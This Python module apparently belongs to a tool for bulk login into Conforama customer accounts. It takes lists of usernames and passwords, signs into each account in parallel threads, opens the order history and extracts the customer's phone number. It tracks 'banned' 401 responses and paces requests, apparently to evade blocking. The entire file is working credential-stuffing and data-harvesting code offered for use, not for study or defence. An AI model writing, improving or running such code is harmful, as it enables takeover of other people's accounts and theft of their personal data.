"""
Phone Extractor Module
Handles the phone number extraction process for accounts
"""

import threading
from typing import Optional, Callable, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

from conforama_session import ConforamaSession
import config


class PhoneResult:
    def __init__(self, username: str, password: str = "", phone: Optional[str] = None, 
                 success: bool = False, error: Optional[str] = None, banned: bool = False):
        self.username = username
        self.password = password
        self.phone = phone
        self.success = success
        self.error = error
        self.banned = banned


class PhoneExtractor:
    def __init__(self, max_workers: int = 3, callback: Optional[Callable] = None):
        self.max_workers = max_workers
        self.callback = callback
        self.stop_event = threading.Event()
    
    def process_single_account(self, username: str, password: str) -> PhoneResult:
        if self.stop_event.is_set():
            return PhoneResult(username, password, error="Process stopped")
        
        try:
            with ConforamaSession() as session:
                login_result = session.get_login_page()
                if login_result == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                if not login_result:
                    return PhoneResult(username, password, error="Failed to load login page")
                
                login_result = session.perform_login(username, password)
                if login_result == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                if not login_result:
                    return PhoneResult(username, password, error="Login failed")
                
                order_result = session.get_order_history()
                if order_result == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                if not order_result:
                    return PhoneResult(username, password, error="Failed to access order history")
                
                phone = session.get_customer_address()
                
                if phone == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                elif phone:
                    result = PhoneResult(username, password, phone=phone, success=True)
                    return result
                else:
                    return PhoneResult(username, password, error="No phone number found")
        
        except Exception as e:
            return PhoneResult(username, password, error=f"Exception: {str(e)}")
    
    def process_accounts_threaded(self, credentials: List[Tuple[str, str]]) -> None:
        completed_count = 0
        total_count = len(credentials)
        
        username_to_password = {username: password for username, password in credentials}
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_account = {}
            
            for i, (username, password) in enumerate(credentials):
                if self.stop_event.is_set():
                    break
                    
                future = executor.submit(self.process_single_account, username, password)
                future_to_account[future] = username
                
                if i > 0 and i % 5 == 0:
                    time.sleep(config.THREAD_STARTUP_DELAY)
            
            for future in as_completed(future_to_account):
                if self.stop_event.is_set():
                    break
                    
                username = future_to_account[future]
                completed_count += 1
                
                try:
                    result = future.result()
                    
                    if self.callback:
                        self.callback(result, completed_count, total_count)
                        
                except Exception as e:
                    password = username_to_password.get(username, "")
                    result = PhoneResult(username, password, error=f"Future exception: {str(e)}")
                    
                    if self.callback:
                        self.callback(result, completed_count, total_count)
    
    def stop(self):
        self.stop_event.set()
